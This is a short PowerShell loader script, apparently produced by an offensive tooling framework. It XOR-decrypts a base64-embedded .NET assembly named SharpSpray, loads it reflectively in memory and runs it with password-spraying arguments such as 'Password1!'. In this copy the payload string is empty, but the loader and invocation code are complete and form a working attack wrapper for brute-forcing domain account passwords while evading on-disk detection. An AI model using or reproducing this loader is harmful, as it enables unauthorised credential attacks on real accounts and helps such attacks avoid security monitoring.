$bef91975 = ""
function Load-XLdr_SharpSpray { param([Parameter ()] $xk = "0x7c")
$loadedAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.Fullname -eq "SharpSpray, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" }
if ($loadedAssembly) {
  return $loadedAssembly[0]  
}
$xk -eq "" -and ($xk = Read-Host "Specify XorKey")
$fb = [Convert]::FromBase64String($bef91975)
for($i=0; $i -lt $fb.count ; $i++) {$fb[$i] = $fb[$i] -bxor $xk}
$asm_XLdr_SharpSpray = [System.Reflection.Assembly]::Load($fb)
return $asm_XLdr_SharpSpray
}
function Invoke-XLdr_SharpSpray { param([Parameter ()] $Params = "--Passwords Password1! --Delay 300")
$asm = Load-XLdr_SharpSpray
$Params -eq "" -and ($Params = Read-Host "Specify command arguments")
$asm.EntryPoint.Invoke($null, (, $Params.split()))
}
